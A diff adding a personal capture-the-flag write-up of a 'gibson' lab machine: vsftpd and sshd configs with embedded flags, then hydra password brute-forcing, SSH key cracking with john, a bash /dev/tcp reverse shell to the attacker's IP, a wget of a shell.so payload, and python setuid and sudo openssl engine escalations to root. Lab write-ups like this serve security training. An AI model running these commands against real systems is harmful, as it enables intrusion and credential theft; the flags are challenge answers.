@@ -585,3 +585,590 @@ connect_from_port_20=YES
 ```
 ```text
 # Note that the default log file location is /var/log/xferlog in this case.
+#xferlog_std_format=YES
+#
+```
+```text
+# You may change the default value for timing out an idle session.
+#idle_session_timeout=600
+#
+```
+```text
+# You may change the default value for timing out a data connection.
+#data_connection_timeout=120
+#
+```
+```text
+# It is recommended that you define on your system a unique user which the
+```
+```text
+# ftp server can use as a totally isolated and unprivileged user.
+#nopriv_user=ftpsecure
+#
+```
+```text
+# Enable this and the server will recognise asynchronous ABOR requests. Not
+```
+```text
+# recommended for security (the code is non-trivial). Not enabling it,
+```
+```text
+# however, may confuse older FTP clients.
+#async_abor_enable=YES
+#
+```
+```text
+# By default the server will pretend to allow ASCII mode but in fact ignore
+```
+```text
+# the request. Turn on the below options to have the server actually do ASCII
+```
+```text
+# mangling on files when in ASCII mode.
+```
+```text
+# Beware that on some FTP servers, ASCII support allows a denial of service
+```
+```text
+# attack (DoS) via the command "SIZE /big/file" in ASCII mode. vsftpd
+```
+```text
+# predicted this attack and has always been safe, reporting the size of the
+```
+```text
+# raw file.
+```
+```text
+# ASCII mangling is a horrible feature of the protocol.
+#ascii_upload_enable=YES
+#ascii_download_enable=YES
+#
+```
+```text
+# You may fully customise the login banner string:
+banner_file=/etc/vsftpd/banner
+#
+```
+```text
+# You may specify a file of disallowed anonymous e-mail addresses. Apparently
+```
+```text
+# useful for combatting certain DoS attacks.
+#deny_email_enable=YES
+```
+```text
+# (default follows)
+#banned_email_file=/etc/vsftpd.banned_emails
+#
+```
+```text
+# You may restrict local users to their home directories.  See the FAQ for
+```
+```text
+# the possible risks in this before using chroot_local_user or
+```
+```text
+# chroot_list_enable below.
+chroot_local_user=YES
+allow_writeable_chroot=YES
+#
+```
+```text
+# You may specify an explicit list of local users to chroot() to their home
+```
+```text
+# directory. If chroot_local_user is YES, then this list becomes a list of
+```
+```text
+# users to NOT chroot().
+```
+```text
+# (Warning! chroot'ing can be very dangerous. If using chroot, make sure that
+```
+```text
+# the user does not have write access to the top level directory within the
+```
+```text
+# chroot)
+#chroot_local_user=YES
+#chroot_list_enable=YES
+```
+```text
+# (default follows)
+#chroot_list_file=/etc/vsftpd.chroot_list
+#
+```
+```text
+# You may activate the "-R" option to the builtin ls. This is disabled by
+```
+```text
+# default to avoid remote users being able to cause excessive I/O on large
+```
+```text
+# sites. However, some broken FTP clients such as "ncftp" and "mirror" assume
+```
+```text
+# the presence of the "-R" option, so there is a strong case for enabling it.
+#ls_recurse_enable=YES
+#
+```
+```text
+# Customization
+#
+```
+```text
+# Some of vsftpd's settings don't fit the filesystem layout by
+```
+```text
+# default.
+#
+```
+```text
+# This option should be the name of a directory which is empty.  Also, the
+```
+```text
+# directory should not be writable by the ftp user. This directory is used
+```
+```text
+# as a secure chroot() jail at times vsftpd does not require filesystem
+```
+```text
+# access.
+secure_chroot_dir=/var/run/vsftpd/empty
+#
+```
+```text
+# This string is the name of the PAM service vsftpd will use.
+pam_service_name=vsftpd
+#
+```
+```text
+# This option specifies the location of the RSA certificate to use for SSL
+```
+```text
+# encrypted connections.
+rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
+rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
+ssl_enable=NO
+```
+```text
+# thm{2124a8091b664c98a0e5bdbb7a4fa1cb}
+```
+```text
+# Uncomment this to indicate that vsftpd use a utf8 filesystem.
+#utf8_filesystem=YES
+anon_root=/var/ftp
+hide_ids=YES
+```
+```text
+# cat /etc/ssh/sshd_config
+#	$OpenBSD: sshd_config,v 1.101  djm Exp $
+```
+```text
+# This is the sshd server system-wide configuration file.  See
+```
+```text
+# sshd_config(5) for more information.
+```
+```text
+# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin
+```
+```text
+# The strategy used for options in the default sshd_config shipped with
+```
+```text
+# OpenSSH is to specify options with their default value where
+```
+```text
+# possible, but leave them commented.  Uncommented options override the
+```
+```text
+# default value.
+```
+```text
+# thm{068754683abe0bf81fb621ce55a91964}
+
+#Port 22
+#AddressFamily any
+#ListenAddress 0.0.0.0
+#ListenAddress ::
+
+#HostKey /etc/ssh/ssh_host_rsa_key
+#HostKey /etc/ssh/ssh_host_ecdsa_key
+#HostKey /etc/ssh/ssh_host_ed25519_key
+```
+```text
+# Ciphers and keying
+#RekeyLimit default none
+```
+```text
+# Logging
+#SyslogFacility AUTH
+#LogLevel INFO
+```
+```text
+# Authentication:
+
+#LoginGraceTime 2m
+#PermitRootLogin prohibit-password
+#StrictModes yes
+#MaxAuthTries 6
+#MaxSessions 10
+
+PubkeyAuthentication yes
+```
+```text
+# Expect .ssh/authorized_keys2 to be disregarded by default in future.
+#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2
+
+#AuthorizedPrincipalsFile none
+
+#AuthorizedKeysCommand none
+#AuthorizedKeysCommandUser nobody
+```
+```text
+# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
+#HostbasedAuthentication no
+```
+```text
+# Change to yes if you don't trust ~/.ssh/known_hosts for
+```
+```text
+# HostbasedAuthentication
+#IgnoreUserKnownHosts no
+```
+```text
+# Don't read the user's ~/.rhosts and ~/.shosts files
+#IgnoreRhosts yes
+```
+```text
+# To disable tunneled clear text passwords, change to no here!
+#PasswordAuthentication yes
+#PermitEmptyPasswords no
+```
+```text
+# Change to yes to enable challenge-response passwords (beware issues with
+```
+```text
+# some PAM modules and threads)
+ChallengeResponseAuthentication no
+```
+```text
+# Kerberos options
+#KerberosAuthentication no
+#KerberosOrLocalPasswd yes
+#KerberosTicketCleanup yes
+#KerberosGetAFSToken no
+```
+```text
+# GSSAPI options
+#GSSAPIAuthentication no
+#GSSAPICleanupCredentials yes
+#GSSAPIStrictAcceptorCheck yes
+#GSSAPIKeyExchange no
+```
+```text
+# Set this to 'yes' to enable PAM authentication, account processing,
+```
+```text
+# and session processing. If this is enabled, PAM authentication will
+```
+```text
+# be allowed through the ChallengeResponseAuthentication and
+```
+```text
+# PasswordAuthentication.  Depending on your PAM configuration,
+```
+```text
+# PAM authentication via ChallengeResponseAuthentication may bypass
+```
+```text
+# the setting of "PermitRootLogin without-password".
+```
+```text
+# If you just want the PAM account and session checks to run without
+```
+```text
+# PAM authentication, then enable this but set PasswordAuthentication
+```
+```text
+# and ChallengeResponseAuthentication to 'no'.
+UsePAM yes
+
+#AllowAgentForwarding yes
+#AllowTcpForwarding yes
+#GatewayPorts no
+X11Forwarding yes
+#X11DisplayOffset 10
+#X11UseLocalhost yes
+#PermitTTY yes
+PrintMotd no
+#PrintLastLog yes
+#TCPKeepAlive yes
+#UseLogin no
+#PermitUserEnvironment no
+#Compression delayed
+#ClientAliveInterval 0
+#ClientAliveCountMax 3
+#UseDNS no
+#PidFile /var/run/sshd.pid
+#MaxStartups 10:30:100
+#PermitTunnel no
+#ChrootDirectory none
+#VersionAddendum none
+```
+```text
+# no default banner path
+Banner /etc/ssh/ssh_banner
+```
+```text
+# Allow client to pass locale environment variables
+AcceptEnv LANG LC_*
+```
+```text
+# override default of no subsystems
+Subsystem sftp	/usr/lib/openssh/sftp-server
+```
+
+## Exploitation
+```text
+# Example of overriding settings on a per-user basis
+#Match User anoncvs
+#	X11Forwarding no
+#	AllowTcpForwarding no
+#	PermitTTY no
+#	ForceCommand cvs server
+PasswordAuthentication yes
+
+Match User gcrawford
+	PasswordAuthentication no
+
+┌──(witty㉿kali)-[~/hackers_koth]
+└─$ hydra -l gcrawford -P /usr/share/wordlists/rockyou.txt 10.10.0.27 ftp -t 64
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ftp://10.10.0.27:21/
+[STATUS] 774.00 tries/min, 774 tries in 00:01h, 14343639 to do in 308:52h, 50 active
+[STATUS] 729.67 tries/min, 2189 tries in 00:03h, 14342224 to do in 327:36h, 50 active
+[STATUS] 721.71 tries/min, 5052 tries in 00:07h, 14339361 to do in 331:09h, 50 active
+[STATUS] 631.67 tries/min, 9475 tries in 00:15h, 14334938 to do in 378:14h, 50 active
+[STATUS] 466.77 tries/min, 14470 tries in 00:31h, 14329943 to do in 511:40h, 50 active
+[21][ftp] host: 10.10.0.27   login: gcrawford   password: cayank
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 14 final worker threads did not complete until end.
+[ERROR] 14 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
+
+┌──(witty㉿kali)-[~/hackers_koth]
+└─$ ftp 10.10.0.27
+Connected to 10.10.0.27.
+220-Ellingson Mineral Company FTP Server
+220-
+220-WARNING
+220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986
+220 
+Name (10.10.0.27:witty): gcrawford
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -lah
+229 Entering Extended Passive Mode (|||61823|)
+150 Here comes the directory listing.
+drwxr-x---    6 ftp      ftp          4096 Apr 30  2020 .
+drwxr-x---    6 ftp      ftp          4096 Apr 30  2020 ..
+lrwxrwxrwx    1 ftp      ftp             9 Apr 30  2020 .bash_history -> /dev/null
+-rw-r--r--    1 ftp      ftp           220 Apr 29  2020 .bash_logout
+-rw-r--r--    1 ftp      ftp          3771 Apr 29  2020 .bashrc
+drwx------    2 ftp      ftp          4096 Apr 29  2020 .cache
+drwx------    3 ftp      ftp          4096 Apr 29  2020 .gnupg
+drwxrwxr-x    3 ftp      ftp          4096 Apr 29  2020 .local
+-rw-r--r--    1 ftp      ftp           807 Apr 29  2020 .profile
+drwx------    2 ftp      ftp          4096 Jul 08 19:51 .ssh
+-r--------    1 ftp      ftp           252 Apr 30  2020 business.txt
+226 Directory send OK.
+ftp> cd .ssh
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||31407|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           398 Jul 08 19:51 authorized_keys
+-rw-------    1 ftp      ftp          1766 Jul 08 19:51 id_rsa
+-rw-r--r--    1 ftp      ftp           398 Jul 08 19:51 id_rsa.pub
+226 Directory send OK.
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||59043|)
+150 Opening BINARY mode data connection for id_rsa (1766 bytes).
+100% |******************************|  1766        1.80 MiB/s    00:00 ETA
+226 Transfer complete.
+1766 bytes received in 00:00 (8.72 KiB/s)
+ftp> exit
+221 Goodbye.
+
+┌──(witty㉿kali)-[~/hackers_koth]
+└─$ chmod 600 id_rsa 
+                                                                           
+┌──(witty㉿kali)-[~/hackers_koth]
+└─$ ssh2john id_rsa > crawford_hash.txt
+                                                                           
+┌──(witty㉿kali)-[~/hackers_koth]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt crawford_hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+chelsea12        (id_rsa)     
+1g 0:00:00:00 DONE () 3.030g/s 42375p/s 42375c/s 42375C/s frumusik..420247
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(witty㉿kali)-[~/hackers_koth]
+└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i id_rsa gcrawford@10.10.0.27  
+Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
+Enter passphrase for key 'id_rsa': 
+Last login: Wed Apr 29 19:32:48 2020 from 192.168.170.1
+
+┌──(witty㉿kali)-[~/hackers_koth]
+└─$ ssh -i id_rsa gcrawford@10.10.0.27 
+Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
+Enter passphrase for key 'id_rsa': 
+Last login: Sat Jul  8 20:51:13 2023 from 10.8.19.103
+gcrawford@gibson:~$ sudo -l
+[sudo] password for gcrawford:          
+Sorry, try again.
+[sudo] password for gcrawford:          
+Sorry, try again.
+[sudo] password for gcrawford:     
+sudo: 3 incorrect password attempts
+gcrawford@gibson:~$ ls
+business.txt
+gcrawford@gibson:~$ cat business.txt
+Remember to send the accounts to Rich by 5pm Friday.
+
+Remember to change my password, before the meeting with Mr Belford.
+I hope he doesn't fire me. I need to provide for my family
+I need to send Ben the flag too, thm{d8deb5f0526ec81f784ce68e641cde40}
+gcrawford@gibson:~$ getcap -r / 2>/dev/null
+/usr/bin/python3.6 = cap_setuid+ep
+/usr/bin/python3.6m = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+gcrawford@gibson:~$ /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+```text
+# id
+uid=0(root) gid=1003(gcrawford) groups=1003(gcrawford)
+
+┌──(witty㉿kali)-[~]
+└─$ hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.0.27 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect" -t 64
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking http-post-form://10.10.0.27:80/api/login:username=^USER^&password=^PASS^:Incorrect
+[STATUS] 3076.00 tries/min, 3076 tries in 00:01h, 14341323 to do in 77:43h, 64 active
+[STATUS] 3198.33 tries/min, 9595 tries in 00:03h, 14334804 to do in 74:42h, 64 active
+[80][http-post-form] host: 10.10.0.27   login: plague   password: 111189
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
+
+http://10.10.0.27/backdoor/shell/
+
+=============================
+=    daPlague's backdoor    =
+=     Skiddies Keep Out     =
+=============================
+plague@gibson:$ /bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1
+
+┌──(witty㉿kali)-[~/hackers_koth]
+└─$ rlwrap nc -lvp 4444
+listening on [any] 4444 ...
+10.10.0.27: inverse host lookup failed: Unknown host
+connect to [10.8.19.103] from (UNKNOWN) [10.10.0.27] 56068
+bash: cannot set terminal process group (794): Inappropriate ioctl for device
+bash: no job control in this shell
+production@gibson:~/webserver$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+production@gibson:~/webserver$ getcap -r / 2>/dev/null
+getcap -r / 2>/dev/null
+/home/production/webserver/server = cap_net_bind_service+ep
+/usr/bin/python3.6 = cap_setuid+ep
+/usr/bin/python3.6m = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+production@gibson:~/webserver$ sudo -l
+sudo -l
+Matching Defaults entries for production on gibson:
+    env_reset, pwfeedback, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User production may run the following commands on gibson:
+    (root) NOPASSWD: /usr/bin/openssl
+production@gibson:~/webserver$ /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+< -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+```text
+# id
+id
+uid=0(root) gid=1001(production) groups=1001(production)
+```
+
+## Privilege Escalation
+```text
+# exit
+exit
+production@gibson:~/webserver$ sudo -l
+sudo -l
+Matching Defaults entries for production on gibson:
+    env_reset, pwfeedback, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User production may run the following commands on gibson:
+    (root) NOPASSWD: /usr/bin/openssl
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ locate shell.so   
+/home/witty/Downloads/shell.so
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.0.27 - - [08/Jul/2023 17:00:19] "GET /shell.so HTTP/1.1" 200 -
+
+production@gibson:~/webserver$ cd /tmp
+cd /tmp
+production@gibson:/tmp$ wget http://10.8.19.103:1234/shell.so
+wget http://10.8.19.103:1234/shell.so
+--  http://10.8.19.103:1234/shell.so
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 14152 (14K) [application/octet-stream]
+Saving to: ‘shell.so’
+
+shell.so            100%[===================>]  13.82K  72.1KB/s    in 0.2s    
+
+(72.1 KB/s) - ‘shell.so’ saved [14152/14152]
+
+production@gibson:/tmp$ chmod +x shell.so
+chmod +x shell.so
+production@gibson:/tmp$ sudo openssl req -engine ./shell.so
+sudo openssl req -engine ./shell.so
+root@gibson:/tmp# cd /root
+cd /root
+root@gibson:/root# ls
+ls
+king.txt  koth
+```
+Capture all 9 flags.
+Completed
+
+## Notes / Lessons Learned
+[[One Piece]]
+
